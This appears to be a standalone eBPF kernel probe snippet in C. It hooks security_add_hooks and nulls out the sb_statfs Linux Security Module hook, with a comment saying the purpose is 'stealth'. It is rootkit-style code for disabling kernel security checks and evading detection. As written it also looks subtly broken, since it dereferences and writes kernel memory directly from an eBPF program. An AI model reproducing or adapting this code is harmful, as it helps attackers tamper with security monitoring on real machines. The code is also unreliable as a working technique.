SEC("kprobe/security_add_hooks")
int hook_security(struct pt_regs *regs) {
	struct security_hook_list *hooks;
	bpf_probe_read(&hooks, sizeof(hooks), &regs->di);
	
	// Nullify LSM hooks for stealth
	if (hooks->hook.sb_statfs) {
		hooks->hook.sb_statfs = NULL;
	}
	return 0;
}